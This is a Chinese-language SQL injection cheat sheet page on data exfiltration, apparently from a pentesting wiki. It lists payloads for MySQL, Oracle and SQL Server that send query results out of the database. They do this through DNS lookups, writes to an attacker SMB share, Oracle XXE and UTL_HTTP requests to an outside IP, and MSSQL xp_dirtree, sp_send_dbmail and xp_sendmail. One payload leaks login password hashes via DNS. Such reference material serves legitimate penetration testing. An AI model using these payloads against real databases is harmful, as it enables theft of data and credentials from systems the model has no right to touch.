### 数据泄露 {docsify-ignore-all}

泄漏的数据以及任何受损数据的脱机副本可以用来做数据分析。数据可以通过文件，各种Layer 4请求和隐藏技术被泄漏。


`* `需要特权用户

#### MySQL




| 描述   |      语句     |  
|----------|:-------------:|
| DNS 请求   |      ```SELECT LOAD\_FILE(concat('\\\\',(QUERY\_WITH\_ONLY\_ONE\_ROW), 'yourhost.com\\'))```     | 
| SMB 分享  |      ```SELECT * FROM USERS INTO OUTFILE '\\attacker\SMBshare\output.txt' ```    |  
| HTTP 服务器   |      ```SELECT * FROM USERS INTO OUTFILE '/var/www/html/output.txt'```     |  
| 数字连接   |      ```SELECT length(user())```<br />```SELECT ASCII(substr(user(),1)) ```<br />当数据只能作为数字导出时，转换为ASCII。 有关自动化[点击此处连接](http://zombiehelp54.blogspot.ro/2017/02/sql-injection-in-update-query-bug.html?m=1).|  



#### Oracle

| 描述   |      语句     |  
|----------|:-------------:|
|将多行合并为一行 |      `SELECT dbms_xmlgen.getxmltype('select user from dual') FROM dual`    |  
| XML外部实体  |      ``` SELECT xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://IP/test"> %remote; %param1;]>') FROM dual; ```    |  
| URL\_HTTP 请求 (Pre-11gR2)   |      `SELECT UTL_HTTP.request ('http://IP/test') FROM dual;`     |  
| 避免特殊字符   |      	``` SELECT UTL_URL.escape('http://IP/'```  &#124;&#124; ```USER) FROM dual;```   |  



#### SQL Server

注意：可以从MSSQL发出DNS请求。但是，此请求需要管理员权限和SQL Server 2005。



| 描述   |      语句     |  
|----------|:-------------:|
| 制造DNS请求  |      ```DECLARE @host varchar(800); select @host = name + '-' + master.sys.fn_varbintohexstr(password_hash) + 'netspi.com' from sys.sql_logins;exec('xp_fileexist "\' + @host + 'c$boot.ini"');```     |  
|UNC路径（DNS请求）   |      ```xp_dirtree ‘\\data.domain.com\file’```     |  
| 启用`sp_send_dbmail`并发送查询  |      ``` sp_configure 'show advanced options', 1;RECONFIGURE;sp_configure 'Database Mail XPs', 1;RECONFIGURE;exec msdb..sp_send_dbmail @recipients='harold@netspi.com',@query='select @@version'; ```     |  
| 基本的`xp_sendmail`查询   |      ``` EXEC master..xp_sendmail 'harold@netspi.com', 'This is a test.' ```     |  
| 使用`xp_sendmail`发送完整的电子邮件   |      ``` EXEC xp_sendmail @recipients='harold@netspi.com', @message='This is a test.', @copy_recipients='test@netspi.com', @subject='TEST' ```   |  
| 通过`xp_sendmail`发送查询结果   |     ``` EXEC xp_sendmail 'harold@netspi.com', @query='SELECT @@version'; ```    |  
| 通过`xp_sendmail`发送查询结果作为附件   |  ``` CREATE TABLE ##texttab (c1 text) INSERT ##texttab values ('Put messge here.') DECLARE @cmd varchar(56)SET @cmd = 'SELECT c1 from ##texttab'EXEC master.dbo.xp_sendmail 'robertk',@query = @cmd, @no_header='TRUE'DROP TABLE ##texttab ```      |  











